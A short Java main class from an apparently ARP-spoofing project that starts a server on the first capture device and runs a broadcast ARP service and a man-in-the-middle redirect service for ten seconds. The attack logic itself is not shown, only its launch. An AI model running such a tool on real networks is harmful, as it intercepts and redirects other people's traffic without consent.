package org.bitducks.spoofing.main;

import java.io.IOException;

import jpcap.JpcapCaptor;

import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.services.BroadcastARPService;
import org.bitducks.spoofing.services.RedirectMITM;

public class MainLED {

	/**
	 * @param args
	 * @throws IOException 
	 * @throws InterruptedException 
	 */
	public static void main(String[] args) throws IOException, InterruptedException {
		Server.createInstance(JpcapCaptor.getDeviceList()[0]);
		Server.getInstance().addService(new BroadcastARPService());
		Server.getInstance().addService(new RedirectMITM());
		Server.getInstance().start();
		Thread.sleep(10000);
		Server.getInstance().stopServer();

	}

}
